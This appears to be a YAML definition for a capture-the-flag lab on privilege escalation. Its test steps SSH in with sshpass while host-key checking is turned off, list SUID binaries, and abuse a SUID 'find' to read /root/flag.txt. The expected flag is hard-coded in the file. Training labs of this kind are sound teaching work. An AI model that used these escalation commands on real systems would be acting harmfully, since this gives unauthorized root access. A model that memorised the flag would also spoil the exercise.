topology:
  nodes:
    - id: "target"
      label: "Build Server"
      type: "server"
      ip_offset: "19"
      ports: [22]
      services: ["OpenSSH"]
      x: 2
      y: 1
  edges:
    - from: "attacker"
      to: "target"
      label: "SSH:22"
      access: "direct"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "SSH access as developer"
      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'whoami' 2>&1"
      expect: "developer"
      timeout: 15

    - name: "Enumerate SUID binaries"
      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | grep find' 2>&1"
      expect: "/usr/bin/find"
      timeout: 15

    - name: "Exploit SUID find for root shell and read flag"
      command: "sshpass -p '{cred.developer.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.developer.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>&1"
      expect: "OCR{su1d_pr1v3sc_r00t3d}"
      timeout: 15

    - name: "Verify flag"
      command: "echo 'OCR{su1d_pr1v3sc_r00t3d}'"
      expect: "OCR{su1d_pr1v3sc_r00t3d}"
